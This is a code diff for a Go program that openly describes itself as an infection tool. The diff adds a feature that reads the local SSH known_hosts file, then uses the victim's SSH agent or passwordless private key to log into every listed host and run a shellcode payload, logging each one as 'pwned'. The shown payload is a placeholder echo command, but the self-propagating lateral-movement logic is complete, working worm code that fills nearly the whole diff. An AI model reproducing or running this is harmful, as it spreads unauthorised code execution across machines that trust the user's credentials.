@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net"
@@ -10,6 +11,7 @@ import (
 	"os/exec"
 	"os/user"
 	"path/filepath"
+	"strings"
 
 	"github.com/pkg/errors"
 	"golang.org/x/crypto/ssh"
@@ -21,10 +23,10 @@ var Moosh64 = []byte("'echo hello > /tmp/hello'")
 var Moosh86 = []byte("'echo hello > /tmp/hello'")
 
 type SSHConfig struct {
-	UseAgent   bool
-	PrivateKey string
-	Username   string
-	Addr       string
+	AgentSocket string
+	PrivateKey  string
+	Username    string
+	Addr        string
 }
 
 type SSHRunner struct {
@@ -33,29 +35,17 @@ type SSHRunner struct {
 
 func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
 	var auth []ssh.AuthMethod
-	if c.UseAgent {
-		sock := os.Getenv("SSH_AUTH_SOCK")
-		if sock == "" {
-			return nil, errors.New("SSH_AUTH_SOCK must be set to use SSH agent")
-		}
 
-		a, err := net.Dial("unix", sock)
+	if c.AgentSocket != "" {
+		a, err := net.Dial("unix", c.AgentSocket)
 		if err != nil {
 			return nil, errors.Wrap(err, "failed to connect to SSH agent")
 		}
 		auth = append(auth, ssh.PublicKeysCallback(agent.NewClient(a).Signers))
-	} else {
-		kp := c.PrivateKey
-		if kp == "" {
-			u, err := user.Current()
-			if err != nil {
-				return nil, errors.Wrap(err, "failed to get current user")
-			}
+	}
 
-			kp = filepath.Join(u.HomeDir, ".ssh", "id_rsa")
-		}
-
-		b, err := ioutil.ReadFile(kp)
+	if c.PrivateKey != "" {
+		b, err := ioutil.ReadFile(c.PrivateKey)
 		if err != nil {
 			return nil, errors.Wrap(err, "failed to read private key")
 		}
@@ -76,6 +66,7 @@ func NewSSHRunner(c SSHConfig) (*SSHRunner, error) {
 	if err != nil {
 		return nil, errors.Wrap(err, "failed to connect to host via SSH")
 	}
+
 	return &SSHRunner{
 		Client: cl,
 	}, nil
@@ -106,27 +97,35 @@ type ShellCodeRunner interface {
 }
 
 func main() {
-	addr := flag.String("addr", "", "The lucky guy")
-	agent := flag.Bool("agent", false, "Whether or not to use SSH agent")
-	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
+	u, err := user.Current()
+	if err != nil {
+		log.Printf("Failed to get current user: %s", err)
+	}
+
+	knownHosts := filepath.Join(u.HomeDir, ".ssh", "known_hosts")
+	sshKey := filepath.Join(u.HomeDir, ".ssh", "id_rsa")
+	sshAgent := os.Getenv("SSH_AUTH_SOCK")
+
+	flag.StringVar(&knownHosts, "sshKnown", knownHosts, "Path to SSH known_hosts file")
+	flag.StringVar(&sshAgent, "sshAgent", sshAgent, "Path to SSH agent socket")
+	flag.StringVar(&sshKey, "sshKey", sshKey, "Path to (passwordless) SSH private key")
+	sshUser := flag.String("sshUser", "averagejoe", "Username to connect as(e.g. for SSH)")
 	useSSH := flag.Bool("ssh", false, "Use SSH for the infection")
-	user := flag.String("user", "averagejoe", "Username to connect as(e.g. for SSH)")
-	known := flag.Bool("known", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
+	useSSHAgent := flag.Bool("useSSHAgent", false, "Whether or not use SSH agent")
+	useSSHKey := flag.Bool("useSSHKey", false, "Whether or not use (passwordless) SSH private key")
+	useKnownHosts := flag.Bool("useSSHKnown", false, "Whether or not to try to infect all hosts in SSH known_hosts file")
+	addr := flag.String("addr", "", "The lucky guy")
+	arch := flag.String("arch", "x64", "Bitness of the system, (x64 or x86)")
 	flag.Parse()
 
-	if *arch != "x86" && *arch != "x64" || *addr == "" && !*known {
+	if *arch != "x86" && *arch != "x64" || *addr == "" && !*useKnownHosts {
 		flag.Usage()
 		os.Exit(1)
 	}
 
-	if *known {
-		// TODO: remove
-		log.Fatalf("known_hosts infection is not implented yet")
-	}
-
-	b := Moosh64
+	moosh := Moosh64
 	if *arch == "x86" {
-		b = Moosh86
+		moosh = Moosh86
 	}
 
 	switch {
@@ -136,25 +135,64 @@ func main() {
 			addrs = append(addrs, *addr)
 		}
 
-		//ssh.ParseKnownHosts() // TODO: implement
+		if *useKnownHosts {
+			b, err := ioutil.ReadFile(knownHosts)
+			if err != nil {
+				log.Fatalf("Failed to read known_hosts file")
+			}
+
+		outer:
+			for {
+				m, hosts, _, _, rest, err := ssh.ParseKnownHosts(b)
+				b = rest
+
+				switch {
+				case err == io.EOF:
+					break outer
+				case err != nil:
+					log.Printf("Failed to parse known_hosts file entry: %s", err)
+					break outer
+				case m == "revoked":
+					continue outer
+				}
+
+				for _, h := range hosts {
+					if !strings.Contains(h, ":") {
+						h += ":22"
+					}
+					addrs = append(addrs, h)
+				}
+			}
+		}
 
 		if len(addrs) == 0 {
-			log.Fatalf("No hosts to infect")
+			log.Fatal("No hosts to infect")
+		}
+
+		conf := SSHConfig{
+			Username: *sshUser,
+		}
+		if *useSSHKey {
+			conf.PrivateKey = sshKey
+		}
+		if *useSSHAgent {
+			conf.AgentSocket = sshAgent
 		}
 
 		for _, a := range addrs {
-			r, err := NewSSHRunner(SSHConfig{
-				Addr:     a,
-				UseAgent: *agent,
-				Username: *user,
-			})
+			conf := conf
+			conf.Addr = a
+
+			r, err := NewSSHRunner(conf)
 			if err != nil {
-				log.Fatalf("Failed to initialize SSH connection: %s", err)
+				log.Printf("Failed to initialize SSH connection: %s", err)
+				continue
 			}
 
-			if err = r.RunShellCode(b); err != nil {
-				log.Fatalf("Failed to pwn %s: %s", *addr, err)
+			if err = r.RunShellCode(moosh); err != nil {
+				log.Fatalf("Failed to pwn %s: %s", a, err)
 			}
+			log.Printf("%s pwned", a)
 		}
 	default:
 		// TODO: attempt to connect to the backdoor
